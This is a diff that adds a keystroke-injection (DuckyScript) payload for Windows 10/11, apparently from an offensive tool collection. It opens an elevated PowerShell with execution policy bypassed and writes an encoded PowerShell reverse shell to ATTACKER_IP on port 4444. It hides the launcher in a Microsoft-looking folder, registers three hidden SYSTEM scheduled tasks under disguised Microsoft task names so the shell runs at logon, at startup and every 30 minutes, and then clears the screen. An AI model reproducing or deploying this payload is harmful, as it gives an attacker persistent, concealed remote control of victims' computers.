@@ -1,0 +1,72 @@
+REM ==========================================
+REM Title: Scheduled Task Persistence
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Creates multiple scheduled
+REM   tasks for persistent execution: on logon,
+REM   at startup, and recurring interval. Uses
+REM   benign-sounding task names and buries
+REM   them in legitimate task folders.
+REM Category: Persistence
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Create payload directory
+STRING $payloadDir = "$env:ProgramData\Microsoft\Windows\DeviceMetadataServicePlugin"
+ENTER
+DELAY 350
+STRING New-Item -ItemType Directory -Path $payloadDir -Force | Out-Null
+ENTER
+DELAY 400
+REM Create encoded payload (reverse shell PowerShell)
+STRING $cmd = 'while($true){try{$c=New-Object Net.Sockets.TcpClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII.GetBytes($r)),0,$r.Length)}}catch{Start-Sleep 300}}'
+ENTER
+DELAY 400
+STRING $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+ENTER
+DELAY 400
+REM Write encoded launcher to disk
+STRING "powershell -W Hidden -EncodedCommand $encoded" | Out-File "$payloadDir\metadata-refresh.cmd" -Encoding ASCII -Force
+ENTER
+DELAY 400
+REM Task 1: Execute on any user logon
+STRING $a1 = New-ScheduledTaskAction -Execute "$payloadDir\metadata-refresh.cmd"
+ENTER
+DELAY 350
+STRING $t1 = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+DELAY 350
+STRING $s1 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 0)
+ENTER
+DELAY 350
+STRING Register-ScheduledTask -TaskName '\Microsoft\Windows\DeviceMetadata\DeviceMetadataRefresh' -Action $a1 -Trigger $t1 -Settings $s1 -User 'SYSTEM' -RunLevel Highest -Force
+ENTER
+DELAY 500
+REM Task 2: Execute at system startup
+STRING $t2 = New-ScheduledTaskTrigger -AtStartup
+ENTER
+DELAY 350
+STRING Register-ScheduledTask -TaskName '\Microsoft\Windows\NetTrace\GatherNetworkInfo_Update' -Action $a1 -Trigger $t2 -Settings $s1 -User 'SYSTEM' -RunLevel Highest -Force
+ENTER
+DELAY 500
+REM Task 3: Execute every 30 minutes as recurring beacon
+STRING $t3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)
+ENTER
+DELAY 350
+STRING Register-ScheduledTask -TaskName '\Microsoft\Windows\Maintenance\WinSAT_Monitor' -Action $a1 -Trigger $t3 -Settings $s1 -User 'SYSTEM' -RunLevel Highest -Force
+ENTER
+DELAY 500
+REM Hide payload file
+STRING (Get-Item "$payloadDir\metadata-refresh.cmd").Attributes = 'Hidden,System'
+ENTER
+DELAY 350
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
